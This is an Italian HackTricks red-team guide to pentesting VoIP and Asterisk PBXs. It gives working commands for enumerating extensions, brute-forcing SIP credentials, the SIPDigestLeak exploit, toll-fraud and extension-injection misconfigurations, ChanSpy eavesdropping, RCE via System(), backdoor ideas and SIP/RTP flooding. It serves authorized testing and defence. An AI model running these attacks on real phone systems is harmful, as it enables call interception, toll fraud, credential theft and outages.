# Pentesting VoIP

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informazioni di base su VoIP

Per iniziare a imparare come funziona VoIP, controlla:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Enumerazione VoIP

### Numeri di telefono

Uno dei primi passi che un Red Team potrebbe fare √® cercare numeri di telefono disponibili per contattare l'azienda utilizzando strumenti OSINT, ricerche su Google o scraping delle pagine web.

Una volta ottenuti i numeri di telefono, √® possibile utilizzare servizi online per identificare l'operatore:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Sapendo se l'operatore fornisce servizi VoIP, √® possibile identificare se l'azienda sta utilizzando VoIP... Inoltre, √® possibile che l'azienda non abbia assunto servizi VoIP ma stia utilizzando schede PSTN per collegare la propria PBX VoIP alla rete telefonica tradizionale.

Cose come risposte automatiche o musica di sottofondo indicano di solito l'utilizzo di VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informazioni OSINT

Qualsiasi altra enumerazione OSINT che aiuti a identificare il software VoIP in uso sar√† utile per un Red Team.

### Enumerazione di rete

* **`nmap`** √® in grado di scansionare i servizi UDP, ma a causa del numero di servizi UDP da scansionare, √® molto lento e potrebbe non essere molto accurato con questo tipo di servizi.
* **`svmap`** di SIPVicious (`sudo apt install sipvicious`): individuer√† i servizi SIP nella rete indicata.
* `svmap` √® **facile da bloccare** perch√© utilizza l'User-Agent `friendly-scanner`, ma √® possibile modificare il codice da `/usr/share/sipvicious/sipvicious` e cambiarlo.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`sipscan.py`** da [**sippts**](https://github.com/Pepelux/sippts)**:** Sipscan √® uno scanner molto veloce per i servizi SIP su UDP, TCP o TLS. Utilizza il multithreading e pu√≤ scansionare ampie gamme di reti. Consente di indicare facilmente un intervallo di porte, scansionare sia TCP che UDP, utilizzare un altro metodo (per impostazione predefinita utilizzer√† OPTIONS) e specificare un diverso User-Agent (e altro).
```bash
./sipscan.py -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **metasploit**:

Metasploit √® un framework di test di penetrazione ampiamente utilizzato per eseguire attacchi su reti e sistemi. Fornisce una vasta gamma di strumenti e moduli che consentono agli hacker di sfruttare vulnerabilit√† e ottenere accesso non autorizzato a sistemi target. Metasploit √® una potente risorsa per i tester di penetrazione, in quanto consente loro di identificare e sfruttare le vulnerabilit√† dei sistemi al fine di migliorare la sicurezza delle reti.
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Enumerazione aggiuntiva della rete

Il PBX potrebbe anche esporre altri servizi di rete come:

* **69/UDP (TFTP)**: Aggiornamenti del firmware
* **80 (HTTP) / 443 (HTTPS)**: Per gestire il dispositivo dal web
* **389 (LDAP)**: Alternativa per memorizzare le informazioni degli utenti
* **3306 (MySQL)**: Database MySQL
* **5038 (Manager)**: Consente di utilizzare Asterisk da altre piattaforme
* **5222 (XMPP)**: Messaggi utilizzando Jabber
* **5432 (PostgreSQL)**: Database PostgreSQL
* E altri...

### Enumerazione dei metodi

√à possibile trovare **quali metodi sono disponibili** per l'uso nel PBX utilizzando `sipenumerate.py` da [**sippts**](https://github.com/Pepelux/sippts)
```bash
python3 sipenumerate.py -i 10.10.0.10 -r 5080
```
### Enumerazione delle estensioni

Le estensioni in un sistema PBX (Private Branch Exchange) si riferiscono agli **identificatori interni unici assegnati a singole** linee telefoniche, dispositivi o utenti all'interno di un'organizzazione o azienda. Le estensioni rendono possibile **instradare le chiamate all'interno dell'organizzazione in modo efficiente**, senza la necessit√† di numeri di telefono esterni individuali per ogni utente o dispositivo.

* **`svwar`** da SIPVicious (`sudo apt install sipvicious`): `svwar` √® uno scanner gratuito di linee di estensione SIP PBX. Concettualmente funziona in modo simile ai tradizionali wardialer **indovinando un intervallo di estensioni o un elenco di estensioni** specifico.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`sipextend.py`** da [**sippts**](https://github.com/Pepelux/sippts)**:** Sipextend identifica le estensioni su un server SIP. Sipextend pu√≤ controllare grandi reti e intervalli di porte.
```bash
python3 sipexten.py -i 10.10.0.10 -r 5080 -e 100-200
```
* **metasploit**: Puoi anche enumerare estensioni/nomi utente con metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** √® un enumeratore di forza bruta per il protocollo Inter Asterisk Exchange (**IAX**). enumIAX pu√≤ operare in due modalit√† distinte; Indovinamento sequenziale del nome utente o Attacco con dizionario.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Attacchi VoIP

### Brute-Force della Password

Avendo scoperto il **PBX** e alcuni **estensioni/nomi utente**, un Red Team potrebbe provare ad **autenticarsi tramite il metodo `REGISTER`** su un'estensione utilizzando un dizionario di password comuni per forzare l'autenticazione.

{% hint style="danger" %}
Nota che un **nome utente** pu√≤ essere lo stesso dell'estensione, ma questa pratica pu√≤ variare a seconda del sistema PBX, della sua configurazione e delle preferenze dell'organizzazione...

Se il nome utente non √® lo stesso dell'estensione, sar√† necessario **individuare il nome utente per forzare la sua password**.
{% endhint %}

* **`svcrack`** da SIPVicious (`sudo apt install sipvicious`): SVCrack consente di forzare la password per un determinato nome utente/estensione su un PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`sipcrack.py`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIP Digest Crack √® uno strumento per craccare le autenticazioni digest all'interno del protocollo SIP.

{% code overflow="wrap" %}
```bash
python3 siprcrack.py -i 10.10.0.10 -r 5080 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Sniffing VoIP

Se trovi attrezzature VoIP all'interno di una **rete Wi-Fi aperta**, potresti **intercettare tutte le informazioni**. Inoltre, se ti trovi all'interno di una rete pi√π chiusa (connessa tramite Ethernet o Wi-Fi protetta), potresti eseguire attacchi **MitM come** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) tra il **PBX e il gateway** per intercettare le informazioni.

Tra le informazioni di rete, potresti trovare **credenziali web** per gestire l'attrezzatura, **estensioni utente**, **nome utente**, **indirizzi IP**, persino **password hashate** e **pacchetti RTP** che potresti riprodurre per **ascoltare la conversazione**, e altro ancora.

Per ottenere queste informazioni, puoi utilizzare strumenti come Wireshark, tcpdump... ma uno **strumento appositamente creato per intercettare le conversazioni VoIP √®** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Nota che se viene utilizzato **TLS nella comunicazione SIP**, non sarai in grado di vedere la comunicazione SIP in chiaro.\
Lo stesso accadr√† se viene utilizzato **SRTP** e **ZRTP**, **i pacchetti RTP non saranno in testo normale**.
{% endhint %}

#### Credenziali SIP

[Controlla questo esempio per capire meglio una **comunicazione SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) per capire come vengono **inviate le credenziali**.

* **`sipdump`** & **`sipcrack`,** parte di **sipcrack** (`apt-get install sipcrack`): Questi strumenti possono **estrarre** da un **pcap** le **autenticazioni digest** all'interno del protocollo SIP e **eseguirne il bruteforce**.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`siptshar.py`, `sipdump.py`, `sipcrack.py`** da [**sippts**](https://github.com/Pepelux/sippts)**:**
* **SipTshark** estrae i dati del protocollo SIP da un file PCAP.
* **SipDump** estrae le autenticazioni SIP Digest da un file PCAP.
* **SIP Digest Crack** √® uno strumento per craccare le autenticazioni digest nel protocollo SIP.
```bash
python3 siptshark.py -f captura3.pcap [-filter auth]
python3 sipdump.py -f captura3.pcap -o data.txt
python3 sipcrack.py -f data.txt -w wordlist/rockyou.txt
```
#### Codici DTMF

Non solo le credenziali SIP possono essere trovate nel traffico di rete, √® anche possibile trovare i codici DTMF che vengono utilizzati ad esempio per accedere alla segreteria telefonica.\
√à possibile inviare questi codici tramite messaggi SIP INFO, tramite audio o all'interno dei pacchetti RTP. Se i codici sono all'interno dei pacchetti RTP, √® possibile tagliare quella parte della conversazione e utilizzare lo strumento multimo per estrarli:
```bash
multimon -a DTMF -t wac pin.wav
```
### Chiamate gratuite / Configurazioni errate delle connessioni Asterisk

In Asterisk √® possibile consentire una connessione **da un indirizzo IP specifico** o da **qualsiasi indirizzo IP**:
```
host=10.10.10.10
host=dynamic
```
Se viene specificato un indirizzo IP, l'host **non dovr√† inviare richieste REGISTER** di tanto in tanto (nel pacchetto REGISTER viene inviato il tempo di vita, di solito 30 minuti, il che significa che in altri scenari il telefono dovr√† effettuare una registrazione ogni 30 minuti). Tuttavia, sar√† necessario avere porte aperte che consentano connessioni dal server VoIP per effettuare chiamate.

Per definire gli utenti possono essere definiti come:

* **`type=user`**: L'utente pu√≤ solo ricevere chiamate come utente.
* **`type=friend`**: √à possibile effettuare chiamate come peer e riceverle come utente (usato con le estensioni)
* **`type=peer`**: √à possibile inviare e ricevere chiamate come peer (SIP-trunks)

√à anche possibile stabilire una fiducia con la variabile non sicura:

* **`insecure=port`**: Consente connessioni peer validate dall'IP.
* **`insecure=invite`**: Non richiede autenticazione per i messaggi INVITE
* **`insecure=port,invite`**: Entrambi

{% hint style="warning" %}
Quando viene utilizzato **`type=friend`**, il **valore** della variabile **host** **non verr√† utilizzato**, quindi se un amministratore **configura erroneamente un SIP-trunk** utilizzando quel valore, **chiunque potr√† connettersi ad esso**.

Ad esempio, questa configurazione sarebbe vulnerabile:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Chiamate gratuite / Misconfigurazioni del contesto di Asterisk

In Asterisk un **contesto** √® un contenitore o una sezione denominata nel piano di chiamata che **raggruppa estensioni, azioni e regole correlate**. Il piano di chiamata √® il componente principale di un sistema Asterisk, poich√© definisce **come vengono gestite e instradate le chiamate in entrata e in uscita**. I contesti vengono utilizzati per organizzare il piano di chiamata, gestire il controllo degli accessi e fornire una separazione tra le diverse parti del sistema.

Ogni contesto √® definito nel file di configurazione, di solito nel file **`extensions.conf`**. I contesti sono indicati da parentesi quadre, con il nome del contesto racchiuso al loro interno. Ad esempio:
```bash
csharpCopy code[my_context]
```
All'interno del contesto, si definiscono le estensioni (modelli di numeri chiamati) e si associano a una serie di azioni o applicazioni. Queste azioni determinano come viene elaborata la chiamata. Ad esempio:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Questo esempio mostra un semplice contesto chiamato "my\_context" con un'estensione "100". Quando qualcuno compone il numero 100, la chiamata verr√† risposta, verr√† riprodotto un messaggio di benvenuto e quindi la chiamata verr√† terminata.

Questo √® **un altro contesto** che consente di **chiamare qualsiasi altro numero**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Se l'amministratore definisce il **contesto predefinito** come:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Chiunque sar√† in grado di utilizzare il **server per chiamare qualsiasi altro numero** (e l'amministratore del server pagher√† per la chiamata).
{% endhint %}

{% hint style="danger" %}
Inoltre, per impostazione predefinita il file **`sip.conf`** contiene **`allowguest=true`**, quindi **qualsiasi** attaccante **senza autenticazione** sar√† in grado di chiamare qualsiasi altro numero.
{% endhint %}

*   **`sipinvite.py`** da [**sippts**](https://github.com/Pepelux/sippts)**:** Sipinvite verifica se un server PBX ci consente di effettuare chiamate senza autenticazione. Se il server SIP ha una configurazione errata, ci permetter√† di effettuare chiamate a numeri esterni. Pu√≤ anche consentirci di trasferire la chiamata a un secondo numero esterno.

Ad esempio, se il tuo server Asterisk ha una cattiva configurazione del contesto, puoi accettare richieste INVITE senza autorizzazione. In questo caso, un attaccante pu√≤ effettuare chiamate senza conoscere alcun utente/password.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
python3 sipinvite.py -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
python3 sipinvite.py -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Chiamate gratuite / IVRS non configurato correttamente

IVRS sta per **Interactive Voice Response System**, una tecnologia telefonica che consente agli utenti di interagire con un sistema computerizzato tramite comandi vocali o tasti. L'IVRS viene utilizzato per creare sistemi di gestione delle chiamate automatizzati che offrono una serie di funzionalit√†, come fornire informazioni, instradare le chiamate e acquisire l'input dell'utente.

L'IVRS nei sistemi VoIP √® tipicamente composto da:

1. **Prompts vocali**: Messaggi audio preregistrati che guidano gli utenti attraverso le opzioni del menu IVR e le istruzioni.
2. **Segnalazione DTMF** (Dual-Tone Multi-Frequency): Input a toni multipli generati premendo i tasti sul telefono, utilizzati per navigare attraverso i menu IVR e fornire input.
3. **Instradamento delle chiamate**: Indirizzare le chiamate alla destinazione appropriata, come dipartimenti specifici, agenti o estensioni in base all'input dell'utente.
4. **Acquisizione dell'input dell'utente**: Raccogliere informazioni dagli chiamanti, come numeri di conto, ID dei casi o qualsiasi altro dato rilevante.
5. **Integrazione con sistemi esterni**: Collegare il sistema IVR a database o altri sistemi software per accedere o aggiornare informazioni, eseguire azioni o attivare eventi.

In un sistema VoIP Asterisk, √® possibile creare un IVR utilizzando il piano di chiamata (file **`extensions.conf`**) e varie applicazioni come `Background()`, `Playback()`, `Read()`, e altre ancora. Queste applicazioni ti aiutano a riprodurre i prompt vocali, acquisire l'input dell'utente e controllare il flusso della chiamata.

#### Esempio di configurazione vulnerabile
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Il precedente √® un esempio in cui all'utente viene chiesto di **premere 1 per chiamare** un dipartimento, **2 per chiamare** un altro, o **l'estensione completa** se la conosce.
La vulnerabilit√† risiede nel fatto che la **lunghezza dell'estensione non viene controllata**, quindi un utente potrebbe inserire un numero completo durante il timeout di 5 secondi e verr√† chiamato.

### Iniezione di estensione

Utilizzando un'estensione come:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Dove **`${EXTEN}`** √® l'**estensione** che verr√† chiamata, quando viene inserito l'**ext 101** ecco cosa succederebbe:
```scss
exten => 101,1,Dial(SIP/101)
```
Tuttavia, se **`${EXTEN}`** consente di introdurre **pi√π di numeri** (come nelle versioni precedenti di Asterisk), un attaccante potrebbe introdurre **`101&SIP123123123`** per chiamare il numero di telefono 123123123. E questo sarebbe il risultato:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Quindi, una chiamata all'estensione **`101`** e **`123123123`** verr√† inviata e solo la prima che risponde alla chiamata verr√† stabilita... ma se un attaccante utilizza un'estensione che bypassa qualsiasi corrispondenza che viene eseguita ma non esiste, potrebbe **iniettare una chiamata solo al numero desiderato**.

## SIPDigestLeak

Il SIP Digest Leak √® una vulnerabilit√† che colpisce un gran numero di telefoni SIP, inclusi sia telefoni IP hardware che software, nonch√© adattatori telefonici (VoIP per analogico). La vulnerabilit√† consente la **divulgazione della risposta di autenticazione Digest**, che viene calcolata dalla password. √à quindi possibile un **attacco offline alla password** che pu√≤ recuperare la maggior parte delle password basate sulla risposta alla sfida.

**[Scenario di vulnerabilit√† da qui**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Un telefono IP (vittima) √® in ascolto sulla porta 5060, accettando chiamate telefoniche
2. L'attaccante invia un INVITE al telefono IP
3. Il telefono della vittima inizia a squillare e qualcuno risponde e riaggancia (perch√© nessuno risponde all'altro capo del telefono)
4. Quando il telefono viene riagganciato, il **telefono della vittima invia un BYE all'attaccante**
5. L'attaccante emette una risposta **407 che richiede l'autenticazione** e emette una sfida di autenticazione
6. Il **telefono della vittima fornisce una risposta alla sfida di autenticazione** in un secondo BYE
7. L'attaccante pu√≤ quindi effettuare un attacco di forza bruta sulla risposta alla sfida sul suo computer locale (o rete distribuita, ecc.) e indovinare la password

* **sipdigestleak.py** da [**sippts**](https://github.com/Pepelux/sippts)**:** SipDigestLeak sfrutta questa vulnerabilit√†.
```bash
python3 sipdigestleak.py -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call permette a un **utente web** (che ad esempio potrebbe essere interessato a un prodotto) di **inserire** il suo **numero di telefono** per essere chiamato. Successivamente verr√† chiamato un operatore commerciale e quando l'utente **risponder√† al telefono**, verr√† **chiamato e connesso con l'agente**.

Un profilo Asterisk comune per questo scopo √®:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Il profilo precedente consente a **QUALSIASI indirizzo IP di connettersi** (se la password √® nota).
* Per **organizzare una chiamata**, come specificato in precedenza, **non √® necessaria alcuna autorizzazione di lettura** e **solo** l'autorizzazione di **origine in scrittura** √® necessaria.

Con tali autorizzazioni, qualsiasi indirizzo IP che conosce la password potrebbe connettersi ed estrarre troppe informazioni, come:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Ulteriori informazioni o azioni potrebbero essere richieste.**

### **Intercettazione**

In Asterisk √® possibile utilizzare il comando **`ChanSpy`** indicando l'**estensione(i) da monitorare** (o tutte) per ascoltare le conversazioni in corso. Questo comando deve essere assegnato a un'estensione.

Ad esempio, **`exten => 333,1,ChanSpy('all',qb)`** indica che se **chiami** l'**estensione 333**, verranno **monitorate** **`tutte`** le estensioni, **inizia ad ascoltare** quando inizia una nuova conversazione (**`b`**) in modalit√† silenziosa (**`q`**) poich√© non vogliamo interagire su di essa. Puoi passare da una conversazione all'altra premendo **`*`**, o segnando il numero dell'estensione.

√à anche possibile utilizzare **`ExtenSpy`** per monitorare una sola estensione.

Invece di ascoltare le conversazioni, √® possibile **registrarle su file** utilizzando un'estensione come:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Le chiamate verranno salvate in **`/tmp`**.

Potresti anche far eseguire ad Asterisk uno script che **rivelerebbe la chiamata** quando viene chiusa.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed

**RTCPBleed** √® un grave problema di sicurezza che colpisce i server VoIP basati su Asterisk (pubblicato nel 2017). La vulnerabilit√† consente al traffico **RTP (Real Time Protocol)**, che trasporta le conversazioni VoIP, di essere **intercettato e reindirizzato da chiunque su Internet**. Questo avviene perch√© il traffico RTP bypassa l'autenticazione durante la navigazione attraverso i firewall NAT (Network Address Translation).

I proxy RTP cercano di affrontare le **limitazioni NAT** che colpiscono i sistemi RTC mediante il proxying dei flussi RTP tra due o pi√π parti. Quando √® presente un NAT, il software del proxy RTP spesso non pu√≤ fare affidamento sulle informazioni IP e di porta RTP recuperate tramite segnalazione (ad esempio SIP). Pertanto, numerosi proxy RTP hanno implementato un meccanismo in cui tale **coppia IP e porta viene appresa automaticamente**. Ci√≤ viene spesso fatto ispezionando il traffico RTP in ingresso e contrassegnando l'IP e la porta di origine per qualsiasi traffico RTP in ingresso come quelli a cui dovrebbe essere risposto. Questo meccanismo, che pu√≤ essere chiamato "modalit√† di apprendimento", **non utilizza alcun tipo di autenticazione**. Pertanto, gli **attaccanti** possono **inviare traffico RTP al proxy RTP** e ricevere il traffico RTP proxy destinato al chiamante o al chiamato di uno stream RTP in corso. Chiamiamo questa vulnerabilit√† RTP Bleed perch√© consente agli attaccanti di ricevere flussi multimediali RTP destinati agli utenti legittimi.

Un altro comportamento interessante dei proxy RTP e delle pile RTP √® che a volte, **anche se non sono vulnerabili a RTP Bleed**, accetteranno, inoltreranno e/o elaboreranno pacchetti RTP da qualsiasi origine. Pertanto, gli attaccanti possono inviare pacchetti RTP che potrebbero consentire loro di iniettare i propri media al posto di quelli legittimi. Chiamiamo questo attacco RTP injection perch√© consente l'iniezione di pacchetti RTP non legittimi in flussi RTP esistenti. Questa vulnerabilit√† pu√≤ essere trovata sia nei proxy RTP che nei terminali.

Asterisk e FreePBX hanno tradizionalmente utilizzato l'impostazione **`NAT=yes`**, che consente al traffico RTP di bypassare l'autenticazione, potenzialmente causando l'assenza di audio o audio unidirezionale nelle chiamate.

Per ulteriori informazioni, consulta [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`rtpbleed.py`** da [**sippts**](https://github.com/Pepelux/sippts)**:** Rileva la vulnerabilit√† RTP Bleed inviando flussi RTP.
```bash
python3 rtpbleed.py -i 10.10.0.10
```
* **`rtcpbleed.py`** da [**sippts**](https://github.com/Pepelux/sippts)**:** Rileva la vulnerabilit√† RTP Bleed inviando flussi RTP
```bash
python3 rtcpbleed.py -i 10.10.0.10
```
* **`rtpbleedflood.py`** da [**sippts**](https://github.com/Pepelux/sippts)**:** Sfrutta la vulnerabilit√† RTP Bleed inviando flussi RTP
```bash
python3 rtpbleedflood.py -i 10.10.0.10 -p 10070 -v
```
* **`rtpbleedinject.py`** da [**sippts**](https://github.com/Pepelux/sippts)**:** Sfrutta la vulnerabilit√† RTP Bleed inviando flussi RTP (da un file audio)
```bash
python3 rtpbleedinject.py -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

In Asterisk riesci in qualche modo a **aggiungere regole di estensione e ricaricarle** (ad esempio compromettendo un server di gestione web vulnerabile), √® possibile ottenere RCE utilizzando il comando **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Esiste un comando chiamato **`Shell`** che pu√≤ essere utilizzato **al posto di `System`** per eseguire comandi di sistema se necessario.

{% hint style="warning" %}
Se il server **impedisce l'uso di determinati caratteri** nel comando **`System`** (come in Elastix), verificare se il server web consente di **creare file nel sistema** (come in Elastix o trixbox) e utilizzarlo per **creare uno script backdoor** e quindi utilizzare **`System`** per **eseguire** tale **script**.
{% endhint %}

#### File locali interessanti e autorizzazioni

* **`sip.conf`** -> Contiene la password degli utenti SIP.
* Se il server Asterisk viene eseguito come root, √® possibile compromettere il sistema root.
* L'utente root di **mysql** potrebbe **non avere alcuna password**.
* Questo potrebbe essere utilizzato per creare un nuovo utente mysql come backdoor.
* **`FreePBX`**
* **`amportal.conf`** -> Contiene la password dell'amministratore del pannello web (FreePBX).
* **`FreePBX.conf`** -> Contiene la password dell'utente FreePBXuser utilizzata per accedere al database.
* Questo potrebbe essere utilizzato per creare un nuovo utente mysql come backdoor.
* **`Elastix`**
* **`Elastix.conf`** -> Contiene diverse password in chiaro come la password di root di mysql, la password di IMAPd, la password dell'amministratore web.
* **Diverse cartelle** apparterranno all'utente Asterisk compromesso (se non viene eseguito come root). Questo utente pu√≤ leggere i file precedenti e controlla anche la configurazione, quindi potrebbe far caricare ad Asterisk altri binari backdoor quando vengono eseguiti.

### Iniezione RTP

√à possibile inserire un file **`.wav`** nelle conversazioni utilizzando strumenti come **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) e **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Oppure √® possibile utilizzare gli script da [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) per **scansionare le conversazioni** (**`rtpscan.pl`**), inviare un file `.wav` a una conversazione (**`rtpsend.pl`**) e **inserire rumore** in una conversazione (**`rtpflood.pl`**).

### DoS

Ci sono diversi modi per cercare di ottenere un attacco DoS sui server VoIP.

* **`sipflood.py`** da [**sippts**](https://github.com/Pepelux/sippts)**: **_**SipFlood**_ invia messaggi illimitati al target
* `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS sul protocollo IAX utilizzato da Asterisk
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Uno strumento per eseguire flooding di messaggi SIP/SDP INVITE tramite UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Invia diversi pacchetti RTP ben formati. √à necessario conoscere le porte RTP in uso (fare uno sniffing prima).
* [**SIPp**](https://github.com/SIPp/sipp): Consente di analizzare e generare traffico SIP, quindi pu√≤ essere utilizzato anche per DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Swiss army knife SIP. Pu√≤ anche essere utilizzato per eseguire attacchi SIP.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).
* **`sipsend.py`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPSend ci consente di inviare un **messaggio SIP personalizzato** e analizzare la risposta.
* **`wssend.py`** da [**sippts**](https://github.com/Pepelux/sippts)**:** WsSend ci consente di inviare un messaggio SIP personalizzato tramite WebSockets e analizzare la risposta.

### Vulnerabilit√† del sistema operativo

Il modo pi√π semplice per installare un software come Asterisk √® scaricare una **distribuzione del sistema operativo** che lo abbia gi√† installato, come ad esempio: **FreePBX, Elastix, Trixbox**... Il problema di queste distribuzioni √® che una volta che sono in funzione, gli amministratori di sistema potrebbero **non aggiornarle pi√π** e con il tempo verranno scoperte vulnerabilit√†.

## Riferimenti

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
